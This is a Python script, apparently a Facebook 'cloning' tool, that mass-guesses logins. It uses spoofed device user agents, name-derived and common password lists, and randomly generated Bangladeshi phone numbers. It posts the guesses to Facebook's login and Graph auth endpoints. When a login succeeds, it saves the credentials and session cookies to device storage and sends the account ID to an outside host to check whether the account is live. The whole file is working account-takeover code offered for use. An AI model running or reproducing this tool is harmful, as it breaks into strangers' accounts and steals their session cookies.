#CODED BY SHIHAB
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
from fake_useragent import UserAgent
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#----------import----------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import json
import sys
#-------------colour------------#	
I="\x1b[38;5;48m"
II="\x1b[38;5;49m"
XXR="\033[38;5;118m"
TT="\033[38;5;119m"
FR="\033[38;5;120m"
FX="\033[38;5;121m"
TE="\033[38;5;122m"
FG="\033[38;5;123m"
RED = "\033[1;91m"
WHITE = "\033[1;97m"
GREEN = "\033[1;32m"
X='\033[1;30m'
XX="\x1b[38;5;196m"
G="\033[1;32m"              
EXTRA ="\x1b[38;5;208m"
PY="\033[38;5;49m"
bFLASH="\033[1;30m" 
M="\033[1;31m"       
BLACK="\033[1;30m"             
RX="\033[38;5;195m"        
P="\033[1;35m"               
C="\033[1;36m"          
B="\033[1;37m"       
G="\033[1;32m"              
R="\033[1;31m"
AA="\033[1;32m"
BB="\033[1;31m"
CC="\033[1;36m"
FF="\033[38;5;118m"
GGG="\x1b[38;5;214m"
W = "\033[97;1m"
S = "\033[96;1m" 	
    
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gtt = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
build=f"SP1A.{random.randint(100000,999999)}.{random.randint(100,999)}"
#-------------------------------------------#
ugen=[]	
for xd in range(5000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)	

for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gtt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(100,114)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android ;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(90,114)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for mx in range(1):
  a='Mozilla/5.0 (Windows NT'
  b=random.choice(["10.0","5.1","6.0","6.1","6.2","6.3"])
  c=random.choice(["Win32; x86","Win64; x64"])
  d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  e=random.randrange(70,130)
  f='0'
  g=random.randrange(3000,6000)
  h=random.randrange(40,180)
  i='Safari/537.36'
  ua=f"{a} {b}; {c}{d}{e}.{f}.{g}.{h} {i}"
  ugen.append(ua)
#__________NEW IDX UA_____________#

def uax():
    a = random.randrange(400, 440)
    y = random.randrange(11, 12)
    x = '0.0'
    b = random.randrange(20, 35)
    c = random.randrange(45, 65)
    d = random.choice(["3.375", "2.5", "2.075", "1.75", "2.25", "1.875", "1.9125", "2.0", "1.4875001", "2.625", "3.0"])
    e = random.choice(["1080", "720"])
    f = random.randrange(1116, 2224)
    g = random.choice(["cs_CZ", "en_GB", "en_US", "lt_LT", "pl_PL", "id_ID", "ru_RU", "pt_PT", "he_IL", "hi_IN", "nl_NL", "it_IT", "en_IN", "es_ES", "en_PK"])
    h = random.randrange(404155879, 554155879)
    i = random.choice(["T-Mobile", "cricket", "Telstra", "MobileVikings", "youSee", "Telkom-Stay Safe", "TTC", "UK", "Home", "vodafone UK", "ALDImobile", "SMARTY", "Verizon", "Metro by T-Mobile", "Ooredoo TN", "MTN-SA", "Telekom.de", "Vodafone AU", "Lebara", "UMNIAH", "Ooredoo TN", "GH MTN", "VIVO", "inwi", "Cell C", "MetroPCS", "HOME", "CoberturaCLARO", "Tele 2"])
    j = random.choice(["Nokia X100", "Nokia G400 5G", "Nokia C5 Endi", "Nokia G10", "Nokia 4.2", "Nokia G21", "Nokia C30", "Nokia G60 5G", "Nokia 2 V Tella", "Nokia 5.1 Plus", "Nokia 5.4", "Nokia C21 Plus", "Nokia 6.2", "Nokia G50", "Nokia 8 V 5G UW", "Nokia 2.3", "N152DL", "Nokia T20", "Nokia 7.2", "Nokia 3.1 C", "TA-1044", "Nokia X20", "Nokia C3", "Nokia C12"])
    s = random.choice(["arm64-v8a:;", "armeabi-v7a:armeabi;"])
    ua = f'[FBAN/FB4A;FBAV/{a}.{x}.{b}.{c};FBBV/{h};FBDM/density={d},width={e},height={f};FBLC/{g};FBRV/{h};FBCR/{i};FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/{j};FBSV/{y};FBOP/1;FBCA/{s}]'
    return ua
#----------logo----------#
logo= (f"""
\x1b[38;5;46m   RRRRRR    AAA   HH   HH IIIII MM    MM 
\x1b[38;5;47m   RR   RR  AAAAA  HH   HH  III  MMM  MMM 
\x1b[38;5;48m   RRRRRR  AA   AA HHHHHHH  III  MM MM MM 
\x1b[38;5;49m   RR  RR  AAAAAAA HH   HH  III  MM    MM 
\x1b[38;5;50m   RR   RR AA   AA HH   HH IIIII MM    MM   
{RX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}[{B}={R}] {G}DEVELOPER  {RX} ⬤{G}  ABDUR RAHIM {R}[{I}𝚂𝙷𝙸𝙷𝙰𝙱{R}]
{R}[{B}={R}] {G}FACEBOOK   {RX} ⬤ {G} ABDUR RAHIM
{R}[{B}={R}] {G}GITHUB     {RX} ⬤ {G} SHIHAB-X
{R}[{B}={R}] {G}TOOL TYPE {RX}  ⬤ {G} FILE & RANDOM
{R}[{B}={R}] {G}VERSION   {RX}  ⬤ {R} ({S}V{R}/{S}0.1{R})
{RX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#----------clear----------#
def clear():
    os.system('clear')
    print(logo)
#----------line----------#
def line():
    print(f"{RX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#----------menu----------#
def main():
    clear()
    print(f'{R}[{B}={R}] {I}[A] FILE CLONING ')
    print(f'{R}[{B}={R}] {I}[B] RANDOM CLONING ')
    print(f'{R}[{B}={R}] {II}[E] EXIT ')
    line()
    option=input(f'{R}[{B}={R}] {G} CHOICE MENU : ')
    if option in ['a','A']:
        __file__()
    elif option in ['b','B']:
    	sexy()
    else:
        exit(' THANKS FOR USING ')
#----------file----------#
def __file__():
    clear()
    filex=input(f'{R}[{B}={R}] {G}ENTER FILE PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(f' {G}File Not Found !!');slp(2)
        main()
    clear()
    try:
        pas_limit=int(input(f'{R}[{B}={R}] {G}ENTER PASSWORD LIMIT (1-20) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f'{R}[{B}={R}] {G}ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as Fnds:
        tl=str(len(fo))
        clear()
        print(f'{R}[{B}={R}] {G}TOTAL IDS{RX}   ⬤{G}  '+tl)
        print(f'{R}[{B}={R}] {G}IF NO RESULT [{W}On/Off{G}] AIRPLANE MODE')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            Fnds.submit(m1,ids,names,passlist)
    line()
    print(f'{R}[{B}={R}] {G}THE PROCESS HAS BEEN COMPLETE')
    input(f'{R}[{B}={R}] {G}PRESS ENTER TO BACK : ')
    main()
loop=0
oks=[]
cps=[]
#----------method------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
            sys.stdout.write(f'\r \033[1;90m[\033[1;92mRAHIM\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': uax(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print('\r\r\033[1;32m [RAHIM-OK💚] '+ids+'|'+pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[96;1m [RAHIM-CP] '+ids+' | '+pss+'\033[1;37m')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#----------end----------#
def sexy():
    user=[]
    os.system('clear')
    print(logo)
    print(f'{R}[{B}={R}] {G}EXAMPLE : {G}017 {X}| {G}019 {X}| {G}016 {X}| {G}018 {X}| {G}013')
    line()
    code = input(f'{R}[{B}={R}] {G}ENTER SIM CODE : ')
    os.system("clear")
    print(logo)
    print(f'{R}[{B}={R}] {G}EXAMPLE : {G}2000 {X}| {G}7777 {X}| {G}10000{X} | {G}20200')
    line()
    limit = int(input(f'{R}[{B}={R}] {G}ENTER LIMIT : '))
    os.system("clear")
    print(logo)
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as Vai:
        tl = str(len(user))
        print(f'{R}[{B}={R}] {G}SIM CODE{RX}    ⬤{G}  {code} ')
        print(f'{R}[{B}={R}] {G}TOTAL IDS{RX}   ⬤{G}  '+tl)
        print(f'{R}[{B}={R}] {G}IF NO RESULT [{W}On/Off{G}] AIRPLANE MODE')
        line()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','sadiya','mimmim','sabbir','708090','77889900','102030','405060','506070','123456','১২৩৪৫৬','১২৩৪৫৬৭৮']
            uid = code+love
            Vai.submit(flash,uid,pwx,tl)
    line()
    print(f'{R}[{B}={R}] {G}THE PROCESS HAS BEEN COMPLETE')
    input(f'{R}[{B}={R}] {G}PRESS ENTER TO BACK : ') 
    main()
def flash(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
            sys.stdout.write(f'\r \033[1;90m[\033[1;92mRAHIM\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
            free_fb = session.get('https://web.facebook.com').text
            log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            header_freefb = {
    'authority': 'web.facebook.com',
    'method': 'POST',
    'path': '/login/',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'dpr': '2.15625',
    'sec-ch-ua': '"Opera";v="97", "Chromium";v="97", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cix = coki.split('c_user=')[1]
                cid = cix[0:15]
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={cid}").text
                if res == 'LIVE':
                  print('\r\r\033[1;32m [RAHIM-OK💚] '+cid+' | '+ps)
                  print('\r\033[1;37m [🍪] COOKIES :- '+coki)
                  open('/sdcard/RAHIM-OK.txt', 'a').write( cid+' | '+ps+'+\n')
                  open('/sdcard/RAHIM-COOKIE.txt', 'a').write( coki+' | '+uid+'+\n')
                  oks.append(uid)
                  break
                if res == 'LOCK':
                  print(f'\r\033[96;1m [RAHIM-LK] '+cid+' | '+ps+'\033[1;37m')
                break
            else:
                continue
        loop+=1
    except:
        pass

main()
